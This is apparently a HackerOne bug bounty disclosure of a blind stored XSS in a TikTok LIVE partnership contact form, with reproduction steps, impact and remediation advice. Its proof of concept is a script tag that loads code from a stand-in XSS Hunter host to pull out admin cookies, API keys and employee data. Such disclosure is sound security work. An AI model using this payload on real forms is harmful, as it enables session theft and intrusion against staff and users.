# Title: Stored XSS on TikTok's Backend Leads to Leakage of Highly Sensitive Administrator Data

- **Platform**: TikTok Bug Bounty
- **Program**: TikTok (HackerOne)
- **Severity**: Critical
- **Date**: 11 September 2025
- **Researcher**: ahmed_xyz
- **Bounty**: N/A (paid bounty, amount undisclosed)
- **Report**: https://hackerone.com/reports/3037447

## Summary

A stored cross-site scripting (XSS) vulnerability was discovered in TikTok's backend contact form system. Malicious JavaScript submitted through a partnership contact form was stored on TikTok's servers and later executed in the context of an internal administrator's browser session. This led to the exfiltration of highly sensitive internal data including administrator cookies, API keys, internal network paths, employee email addresses, and phone numbers.

## Technical Details

The vulnerability existed on a TikTok subdomain dedicated to managing live streaming operations — a platform used by verified agencies, creator networks, and internal teams. The subdomain offered a contact form for partnership inquiries. This form lacked proper input sanitization and output encoding, allowing arbitrary HTML and JavaScript to be stored.

The researcher crafted a custom Blind XSS payload using the XSS Hunter framework. The payload was designed to:

1. Bypass the form's input filters by testing which tags were accepted
2. Execute JavaScript when the stored data was rendered in an internal admin interface
3. Exfiltrate cookies, page content, and internal metadata to an attacker-controlled server

## Steps to Reproduce

1. Navigate to the TikTok LIVE partnership subdomain
2. Locate the contact form for partnership inquiries
3. Inject a Blind XSS payload into one of the form fields (e.g., company name or message body)
4. Submit the form
5. Wait for the payload to be triggered when an internal administrator views the submission
6. Receive the exfiltrated data via XSS Hunter callback

## Proof of Concept

The researcher used XSS Hunter to set up a tracking payload. The payload was embedded in a form field:

```html
<script src="https://xsshunter.example.com/abcd"></script>
```

Six months after submission, the payload was triggered, confirming that the data was stored and later rendered in an internal system without sanitization. The callback revealed:

- Session cookies of authenticated admin users
- Internal API keys and service tokens
- Internal server paths and network topology
- Employee email addresses and phone numbers
- An OTP code sent to the researcher's phone, which was visible in the internal system alongside his contact information

## Impact

An attacker could have:

- Impersonated TikTok administrators via stolen session cookies
- Accessed internal TikTok systems using leaked API keys
- Mapped internal network infrastructure
- Performed targeted phishing attacks against TikTok employees
- Potentially pivoted to deeper infrastructure compromise

## Remediation

- Implement strict input validation and output encoding for all form fields
- Apply Content Security Policy (CSP) headers to prevent inline script execution
- Sanitize all user-submitted content before rendering in admin interfaces
- Use separate, isolated environments for viewing user-submitted data
- Regular security audits of internal-facing administrative tools

## References

- https://hackerone.com/reports/3037447
- https://medium.com/@ahmed_xyz/blind-stored-xss-in-tiktok-live-triggered-in-sensitive-internal-infrastructure-18c433f49d91
- https://www.redpacketsecurity.com/hackerone-bugbounty-disclosure-stored-xss-on-tiktok-s-backend-leads-to-the-leakage-of-highly-sensitive-administrator-data-cookies-api-keys-internal-paths-emails-phone-numbers-ahmed-xyz/
